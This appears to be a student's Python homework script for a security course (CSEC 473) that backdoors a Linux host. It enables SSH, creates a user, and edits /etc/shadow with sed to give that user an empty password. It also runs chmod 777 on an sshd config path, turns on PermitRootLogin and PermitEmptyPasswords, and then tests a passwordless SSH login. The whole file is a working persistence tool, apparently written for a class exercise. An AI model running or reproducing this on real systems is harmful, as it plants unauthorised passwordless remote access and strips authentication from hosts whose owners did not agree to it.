# HW4 Script
import subprocess
import datetime
import os
import time
import fileinput
import socket




def print_msg(msg, msgtype):
    time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
    final_msg = f'[{time}]--[{msgtype}]'
    msgbuffer = len(final_msg)
    lenbuff = 40
    finalbuff = lenbuff-msgbuffer
    for counter in range(0,finalbuff):
        final_msg += ' '
    final_msg += f': {msg}'
    print(final_msg)


def init():
    print("=======================================================================================")
    print_msg("WELCOME! This program is for educational use only!", "INIT")
    print_msg("Created by Kenyon Litt, for CSEC 473", "INIT")
    print("=======================================================================================")


def main():
    print_msg("Starting Main Process.......", "MAIN")
    username = "Script Running under user account  " + os.getlogin()
    print_msg(username, "== INFO ==")
    #print_msg("Provide Account Password for Sudo Access", "MAIN")
    print_msg("Checking status of ssh...", "MAIN")
    ssh_status = (os.popen("sudo systemctl status ssh").read())
    if "active (running)" not in ssh_status:
        print_msg("SSH Needs to be started!", "MAIN")
        os.popen("sudo systemctl enable --now ssh").read()
        os.popen("sudo systemctl start ssh").read()
    else:
        print_msg("SSH Started!", "MAIN")
    print_msg("Provide name for new user", "INPUT")
    new_username = str(input("\t\t\t\t\t> "))
    print_msg(f'Ceating new user account {new_username}', "== INFO ==")
    user_status = (os.popen(f'sudo useradd {new_username}').read())
    if "exsists" in user_status:
        print_msg("User already exists, no need to create!", "!! ERR !!")
    
    print_msg(f'Opening Shadow file and attempting to remove password for user {new_username}', "MAIN")

    flag = True
    while(flag): 
        cat_cmd = subprocess.Popen(['sudo', 'cat', '/etc/shadow'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        grepped_cat_cmd = subprocess.check_output(['grep', new_username], stdin=cat_cmd.stdout)
        shadow_line = "".join(grepped_cat_cmd.decode('utf-8').split(" ")).replace("\n", "")

        if "!" in shadow_line:
            new_shadow_line = shadow_line.replace("!", "")
            #print(new_shadow_line)
            sed_cmd = "sudo sed -i 's/" + shadow_line + "/" + new_shadow_line + "/g' /etc/shadow"
            os.popen(sed_cmd)
        else:
            print_msg(f'/etc/shadow file edit for user {new_username} complete!', 'MAIN')
            print_msg(f'New line in shadow file: {shadow_line}', "== INFO ==")
            flag = False
        time.sleep(5)

    print_msg('Continuing on to sshd config', 'MAIN')
    os.popen(f'sudo chmod +777 /etc/sshd_config')
    time.sleep(1)

    print_msg("Modifying SSHD config to allow root login and empty passwords", "MAIN")
    with open('/etc/ssh/sshd_config') as sshd_config_file:
        sshd_config_data = sshd_config_file.readlines()

    permit_root_login_line = 0
    permit_empty_password_line = 0
    write_flag = False
    for counter in range(0,len(sshd_config_data)):
        if '#PermitRootLogin' in sshd_config_data[counter]:
            permit_root_login_line = counter
            write_flag = True
        if '#PermitEmptyPasswords' in sshd_config_data[counter]:
            permit_empty_password_line = counter
            write_flag = True

    if write_flag:
        #print(sshd_config_data[permit_root_login_line])
        sshd_config_data[permit_root_login_line] = 'PermitRootLogin yes\n'
        #print(sshd_config_data[permit_root_login_line])


        #print(sshd_config_data[permit_empty_password_line])
        sshd_config_data[permit_empty_password_line] = 'PermitEmptyPasswords yes\n'
        #print(sshd_config_data[permit_empty_password_line])

        sshd_config_file = open('/etc/ssh/sshd_config','w')
        sshd_config_file.writelines(sshd_config_data)
        sshd_config_file.close()
    else:
        print_msg('SSHD Options Already Changed, not wriring changes to disk', '== INFO ==')

    print_msg('Completed ssh modification', 'MAIN')
    print_msg('Restarting SSH Service...', 'MAIN')
    os.popen('sudo systemctl restart ssh')
    print_msg('SSH Service restarted!','MAIN')

    print_msg('Grabbing network information of host for ssh...','MAIN')
    hostname = socket.gethostname()
    ipaddr = socket.gethostbyname(hostname)
    #print(ipaddr)

    print_msg(f'Testing SSH Anonymous Connection with new user {new_username}', 'MAIN')
    #ssh_test = os.popen(f'ssh -t {new_username}@{ipaddr} "whoami"').read()
    ssh_test = subprocess.Popen(f"ssh {new_username}@{ipaddr} id", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    print(ssh_test[0])


if __name__ == '__main__':
    init()
    main()
